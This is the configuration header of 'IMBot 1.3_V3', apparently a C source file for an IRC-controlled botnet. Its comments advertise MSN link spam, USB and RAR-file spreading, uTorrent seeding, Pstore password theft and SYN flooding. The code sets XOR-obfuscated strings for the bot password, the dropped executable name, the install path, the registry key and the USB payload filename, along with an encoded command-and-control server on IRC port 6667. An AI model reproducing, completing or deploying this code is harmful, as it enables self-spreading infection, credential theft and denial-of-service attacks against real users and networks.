/*
 ___    _____  __________          __  
|   |  /     \ \______   \  ____ _/  __
|   | /  \ /  \ |    |  _/ /  _ \\   __\
|   |/    Y    \|    |   \(  <_> )|  |
|___|\____|__  /|______  / \____/ |__|
             \/        \/
*/

// IMBot 1.3_V3 by Damming (orginal by h1t3m)
// Stable
// XOr encryption
// Msn link spam with/without email
// Msn Zipsend with message
// fixed Usb spread 
// Rar file injection
// uTorrent Seeder
// Pstore
// Supersyn


char xetumhandle[]		= "SystemUtil";
char bid[]			    = "PID";
char prefix				= '.';

char password[]			= "\xB5\xA4\xB2\xB5";
char authhost1[]		= "\xEB\xE0\xEB\x81\xEB";
char exename[]			= "\xB5\xA4\xB2\xB5\xEF\xA4\xB9\xA4";
char szRegname[]		= "\xB5\xA4\xB2\xB5";
char gotopth[]			= "\xE4\xB6\xA8\xAF\xA5\xA8\xB3\xE4";
char infochan[]			= "\xE2\xB5\xA4\xB2\xB5";
char rarexe[]			= "\x84\xB9\xB5\xB3\xA0\xA2\xB5\xEF\xA4\xB9\xA4";
char USB_STR_FILENAME[]	= "\xB4\xB2\xA3\x9E\xA5\xB3\xA8\xB7\xA4\xB3\xEF\xA4\xB9\xA4";

char *authost[] 	= { Decode(authhost1) };

SERVER sinfo[]=
{
	{ //"server","pass",6667,"chan","cpass","-ix"
	"\xF0\xF3\xF6\xEF\xF1\xEF\xF1\xEF\xF0","\xB5\xA4\xB2\xB5",6667,"\xE2\xB5\xA4\xB2\xB5","\xB5\xA4\xB2\xB5","\xEC\xA8\xB9\x00",
	},
};
 

